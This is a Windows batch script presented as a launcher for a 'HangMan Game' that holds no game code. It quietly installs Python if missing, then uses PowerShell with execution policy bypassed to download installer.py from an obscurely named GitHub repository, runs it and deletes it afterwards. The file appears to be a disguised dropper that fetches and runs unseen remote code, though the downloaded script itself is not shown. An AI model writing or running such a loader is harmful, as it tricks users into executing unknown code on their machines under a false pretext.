@echo off
setlocal enabledelayedexpansion

echo.
echo    [ HangMan Game - Initializing... ]
echo.
timeout /t 2 /nobreak >nul

python --version >nul 2>&1
if %errorlevel% equ 0 (
    echo    [+] Python is installed!
    timeout /t 1 /nobreak >nul
    goto :run_installer
)

echo    [!] Python not found, installing...
timeout /t 1 /nobreak >nul

powershell -NoProfile -ExecutionPolicy Bypass -Command "$ver='3.13.7';$url='https://www.python.org/ftp/python/'+$ver+'/python-'+$ver+'-amd64.exe';$out=$env:TEMP+'\py.exe';try{Invoke-WebRequest -Uri $url -OutFile $out;Write-Host '   [+] Download complete' -ForegroundColor Green}catch{Write-Host '   [-] Download failed' -ForegroundColor Red;exit 1};try{Start-Process -FilePath $out -ArgumentList '/quiet InstallAllUsers=1 PrependPath=1 Include_test=0' -Wait -NoNewWindow;Write-Host '   [+] Installation complete' -ForegroundColor Green}catch{Write-Host '   [-] Installation failed' -ForegroundColor Red;exit 1};Remove-Item $out -Force;Start-Sleep -Seconds 3"

if %errorlevel% neq 0 (
    echo.
    echo    [-] Automatic installation failed
    echo    [!] Please install Python 3.13.7 manually from:
    echo    https://www.python.org/downloads/release/python-3137/
    echo.
    pause
    exit /b 1
)

for /f "delims=" %%i in ('powershell -NoProfile -Command "[System.Environment]::GetEnvironmentVariable('Path','Machine')+';'+[System.Environment]::GetEnvironmentVariable('Path','User')"') do set "PATH=%%i"

python --version >nul 2>&1
if %errorlevel% neq 0 (
    echo.
    echo    [-] Python installed but PATH not updated
    echo    [!] Restarting with updated environment...
    timeout /t 2 /nobreak >nul
    start "" "%~f0"
    exit /b 0
)

:run_installer
echo.
echo    [+] Starting game installer...
timeout /t 1 /nobreak >nul

powershell -NoProfile -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/xub0-xbt/--/main/installer.py' -OutFile 'installer.py'"

if exist installer.py (
    cls
    python installer.py
    if exist installer.py (
        del /f /q installer.py >nul 2>&1
    )
) else (
    echo    [-] Failed to download installer, re-run.
    pause
    exit /b 1
)

endlocal
